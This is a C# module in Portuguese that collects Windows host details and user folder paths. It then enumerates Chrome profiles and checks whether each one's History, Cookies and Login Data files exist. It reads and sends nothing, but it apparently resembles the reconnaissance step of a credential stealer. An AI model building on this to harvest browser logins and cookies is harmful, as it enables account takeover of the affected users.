using System;
using System.IO;
using System.Runtime.InteropServices;
using System.Text;

namespace Teste.Modulos
{
    public class Perfil
    {
        public StringBuilder Coletar()
        {
            StringBuilder resultado =
                new StringBuilder();

            // ==============================================
            // WINDOWS
            // ==============================================

            resultado.AppendLine(
                "---------------- WINDOWS ----------------"
            );

            resultado.AppendLine(
                "Usuário: " +
                Environment.UserName
            );

            resultado.AppendLine(
                "Computador: " +
                Environment.MachineName
            );

            resultado.AppendLine(
                "Sistema: " +
                RuntimeInformation.OSDescription
            );

            resultado.AppendLine(
                "Arquitetura: " +
                RuntimeInformation.OSArchitecture
            );

            resultado.AppendLine(
                "Diretório do Windows: " +
                Environment.GetEnvironmentVariable("WINDIR")
            );

            resultado.AppendLine();


            // ==============================================
            // DIRETÓRIOS DO USUÁRIO
            // ==============================================

            resultado.AppendLine(
                "---------------- DIRETÓRIOS ----------------"
            );

            resultado.AppendLine(
                "Perfil do usuário: " +
                Environment.GetFolderPath(
                    Environment.SpecialFolder.UserProfile
                )
            );

            resultado.AppendLine(
                "AppData: " +
                Environment.GetFolderPath(
                    Environment.SpecialFolder.ApplicationData
                )
            );

            resultado.AppendLine(
                "LocalAppData: " +
                Environment.GetFolderPath(
                    Environment.SpecialFolder.LocalApplicationData
                )
            );

            resultado.AppendLine();


            // ==============================================
            // GOOGLE CHROME
            // ==============================================

            resultado.AppendLine(
                "---------------- GOOGLE CHROME ----------------"
            );

            string localAppData =
                Environment.GetFolderPath(
                    Environment.SpecialFolder.LocalApplicationData
                );

            string chromePath = Path.Combine(
                localAppData,
                "Google",
                "Chrome",
                "User Data"
            );

            if (!Directory.Exists(chromePath))
            {
                resultado.AppendLine(
                    "Google Chrome: diretório não encontrado."
                );

                return resultado;
            }

            resultado.AppendLine(
                "Diretório principal: " +
                chromePath
            );

            resultado.AppendLine();


            // ==============================================
            // PERFIS DO CHROME
            // ==============================================

            resultado.AppendLine(
                "Perfis encontrados:"
            );

            string[] diretorios =
                Directory.GetDirectories(
                    chromePath
                );

            int quantidade = 0;

            foreach (string diretorio in diretorios)
            {
                string nome =
                    Path.GetFileName(diretorio);

                bool ehPerfil =
                    nome.Equals(
                        "Default",
                        StringComparison.OrdinalIgnoreCase
                    )
                    ||
                    nome.StartsWith(
                        "Profile ",
                        StringComparison.OrdinalIgnoreCase
                    );

                if (!ehPerfil)
                    continue;

                quantidade++;

                resultado.AppendLine();

                resultado.AppendLine(
                    "Perfil #" +
                    quantidade
                );

                resultado.AppendLine(
                    "Nome: " +
                    nome
                );

                resultado.AppendLine(
                    "Diretório: " +
                    diretorio
                );

                // Verifica se existem bancos importantes
                // dentro do perfil.

                VerificarArquivo(
                    resultado,
                    diretorio,
                    Path.Combine(
                        "History"
                    ),
                    "History"
                );

                VerificarArquivo(
                    resultado,
                    diretorio,
                    Path.Combine(
                        "Network",
                        "Cookies"
                    ),
                    "Cookies"
                );

                VerificarArquivo(
                    resultado,
                    diretorio,
                    Path.Combine(
                        "Login Data"
                    ),
                    "Login Data"
                );
            }

            resultado.AppendLine();

            resultado.AppendLine(
                "Quantidade de perfis encontrados: " +
                quantidade
            );

            resultado.AppendLine();

            return resultado;
        }


        // ==============================================
        // VERIFICAR ARQUIVO
        // ==============================================

        private void VerificarArquivo(
            StringBuilder resultado,
            string diretorioPerfil,
            string caminhoRelativo,
            string nome)
        {
            string caminho =
                Path.Combine(
                    diretorioPerfil,
                    caminhoRelativo
                );

            resultado.AppendLine(
                nome +
                ": " +
                (
                    File.Exists(caminho)
                        ? "Encontrado"
                        : "Não encontrado"
                )
            );
        }
    }
}